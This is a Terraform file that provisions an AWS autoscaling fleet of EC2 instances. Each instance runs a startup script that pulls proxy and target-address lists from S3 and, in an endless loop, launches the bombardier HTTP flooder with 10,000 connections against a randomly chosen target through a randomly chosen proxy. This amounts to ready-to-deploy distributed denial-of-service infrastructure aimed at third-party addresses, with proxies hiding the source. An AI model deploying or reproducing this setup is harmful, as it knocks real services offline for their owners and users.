terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 3.0"
    }
  }
}

provider "aws" {
  region  = var.region
  profile = var.profile
}

# Create an IAM role for the Web Servers.
resource "aws_iam_role" "iam_role" {
  name               = "${var.name}_role"
  assume_role_policy = <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Action": "sts:AssumeRole",
      "Principal": {
        "Service": ["ec2.amazonaws.com", "ssm.amazonaws.com" ]
      },
      "Effect": "Allow",
      "Sid": ""
    }
  ]
}
EOF
}

resource "aws_iam_instance_profile" "instance_profile" {
  name  = "${var.name}_instance_profile"
  role  = aws_iam_role.iam_role.name
}

resource "aws_iam_role_policy_attachment" "instance_connect" {
  role       = aws_iam_role.iam_role.id
  policy_arn = "arn:aws:iam::aws:policy/service-role/AmazonEC2RoleforSSM"
}

resource "aws_iam_role_policy" "role_policy" {
  name   = "${var.name}_policy"
  role   = aws_iam_role.iam_role.id
  policy = <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
        "Effect": "Allow",
        "Action": [
            "s3:ListBucket"
        ],
        "Resource": [
            "arn:aws:s3:::bucket-name"
        ]
    },
    {
        "Effect": "Allow",
        "Action": [
            "s3:PutObject",
            "s3:GetObject",
            "s3:DeleteObject"
        ],
        "Resource": [
            "arn:aws:s3:::bucket-name/*"
        ]
    },
    {
        "Effect": "Allow",
        "Action": "ec2-instance-connect:SendSSHPublicKey",
        "Resource": "*",
        "Condition": {
            "StringEquals": {
                "ec2:osuser": "ec2-user"
            }
        }
    },
    {
        "Effect": "Allow",
        "Action": [
            "ec2:DescribeInstances",
            "ec2:CreateTags"
        ],
        "Resource": "*"
    }
  ]
}
EOF
}

resource "aws_s3_bucket" "proxies_bucket" {
  count         = var.deploy_bucket
  force_destroy = true
  bucket        = var.bucket_name
}

resource "aws_s3_bucket_object" "addresses" {
  count  = var.deploy_bucket
  key    = "addresses.txt"
  bucket = var.bucket_name
  source = "addresses.txt"
  etag   = filemd5("addresses.txt")
}

resource "aws_s3_bucket_object" "proxies" {
  count  = var.deploy_bucket
  key    = "proxies.txt"
  bucket = var.bucket_name
  source = "proxies.txt"
  etag   = filemd5("proxies.txt")
}



resource "aws_security_group" "instance_connect" {
  vpc_id      = aws_vpc.main.id
  name_prefix = "instance_connect"
  description = "allow ssh"
  ingress {
    cidr_blocks      = ["0.0.0.0/0",]
    description      = ""
    from_port        = 22
    ipv6_cidr_blocks = []
    prefix_list_ids  = []
    protocol         = "tcp"
    security_groups  = []
    self             = false
    to_port          = 22
  }
  egress {
    cidr_blocks      = ["0.0.0.0/0",]
    description      = ""
    from_port        = 0
    ipv6_cidr_blocks = []
    prefix_list_ids  = []
    protocol         = -1
    security_groups  = []
    self             = false
    to_port          = 0
  }
}

resource "aws_internet_gateway" "test-env-gw" {
  vpc_id = aws_vpc.main.id
}

resource "aws_route_table" "route-table-test-env" {
  vpc_id = aws_vpc.main.id
  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.test-env-gw.id
  }
}
resource "aws_route_table_association" "subnet-association" {
  subnet_id      = aws_subnet.main.id
  route_table_id = aws_route_table.route-table-test-env.id
}
resource "aws_launch_template" "example" {
  name                                 = var.name
  image_id                             = var.ami_id
  instance_initiated_shutdown_behavior = "terminate"
  instance_type                        = var.instance_type
  user_data                            = base64encode(<<EOF
#!/bin/bash -xe
exec > >(tee /var/log/user-data.log|logger -t user-data -s 2>/dev/console) 2>&1
    yum update -y
    amazon-linux-extras install docker
    service docker start
    usermod -a -G docker ec2-user
    chkconfig docker on
    while true
    do
        sleep 60
        if [ $(docker info --format '{{ .ContainersRunning }}') == "0" ]
        then
            echo no container running
            aws s3 cp s3://${var.bucket_name}/proxies.txt proxies.txt
            sed 's/\r$//' proxies.txt > proxies1.txt
            aws s3 cp s3://${var.bucket_name}/addresses.txt addresses.txt
            sed 's/\r$//' addresses.txt > addresses1.txt
            export DOCKER_PROXY=$(shuf -n 1 proxies1.txt)
            export TARGET_ADDRESS=$(shuf -n 1 addresses1.txt)
            export RUN_FOR=$(shuf -i 12-26 -n 1)
            date
            docker run --rm -ti -d --name volia --env HTTP_PROXY="http://$${DOCKER_PROXY}" alpine/bombardier -c 10000 -d $${RUN_FOR}m -l $${TARGET_ADDRESS}
        fi
    done

EOF
  )
  iam_instance_profile {
    name = "${var.name}_instance_profile"
  }
  vpc_security_group_ids = [aws_security_group.instance_connect.id]
  tag_specifications {
    resource_type = "instance"
    tags          = {
      Name = "${var.name}-server"
    }
  }
  tag_specifications {
    resource_type = "volume"
    tags          = {
      Name = "${var.name}-server"
    }
  }
  tag_specifications {
    resource_type = "network-interface"
    tags          = {
      Name = "${var.name}-server"
    }
  }
}

resource "aws_autoscaling_group" "example" {
  name                      = var.name
  capacity_rebalance        = true
  desired_capacity          = var.desired_capacity
  max_size                  = var.max_size
  min_size                  = var.min_size
  vpc_zone_identifier       = [aws_subnet.main.id]
  health_check_grace_period = 180
  launch_template {
    id      = aws_launch_template.example.id
    version = aws_launch_template.example.latest_version
  }
}

resource "aws_vpc" "main" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support   = true
}

resource "aws_subnet" "main" {
  vpc_id                  = aws_vpc.main.id
  cidr_block              = "10.0.1.0/24"
  map_public_ip_on_launch = true
}
